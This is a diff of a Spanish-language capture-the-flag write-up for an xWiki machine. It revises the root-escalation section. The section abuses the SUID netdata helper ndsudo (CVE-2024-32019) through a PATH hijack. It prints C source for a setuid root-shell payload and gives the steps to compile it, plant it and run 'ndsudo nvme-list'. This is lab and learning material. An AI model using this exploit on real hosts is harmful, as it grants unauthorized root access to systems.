@@ -1,4 +1,4 @@
-#xWiki #RCE 
+#xWiki #RCE #SUID
 
 ## Reconocimiento
 Empezamos la maquina realizando un reconocimiento de puertos y servicios con [[NMAP]]:
@@ -39,22 +39,23 @@ y no nos otorga ninguna información
 
 Probamos con los permisos SUID `find / -perm -4000 2>/dev/null`
 Encontramos este fichero `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo`
-Buscamos información sobre el en internet y descubrimos que es una herramienta diseñada para ejecutar programas con privilegios elevados, encontramos también un POC de escalada de privilegios y lo seguimos paso por paso `https://xsec.sh/blog/untrusted-search-path/`
+Buscamos información sobre el en internet y descubrimos que es una herramienta diseñada para ejecutar programas con privilegios elevados, encontramos también un POC de escalada de privilegios y lo seguimos paso por paso `https://github.com/AzureADTrent/CVE-2024-32019-POC`
 
 En nuestra maquina atacante crearemos un fichero `nano nvme.c`
-Con el siguiente contedio
+Con el siguiente contenido
 ```C
 #include <unistd.h>
-#include <stdlib.h>
-int main() {
 
-setuid(0);
-setgid(0);
-system("cp /bin/bash /tmp/pwn && chmod +s /tmp/pwn");
-return 0;
+int main() {
+    setuid(0); setgid(0);
+    execl("/bin/bash", "bash", NULL);
+    return 0;
 }
 ```
 
-Este script crea una bash en la carpeta actual y le asigna permisos para conseguir correr `bash -p`
+Este script crea una bash privilegiada en la carpeta actual
 
-Lo compilarem
+Lo compilaremos en nuestra maquina atacante `gcc -o nvme nvme.c` y nos lo compartimos a nuestra maquina victima, en esta le damos permisos de ejecución.
+
+Configuramos el PATH en `/tmp` con `export PATH=$(pwd):$PATH`
+Después solo deberemos ejecutar `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list` Y seremos el usuario `root`
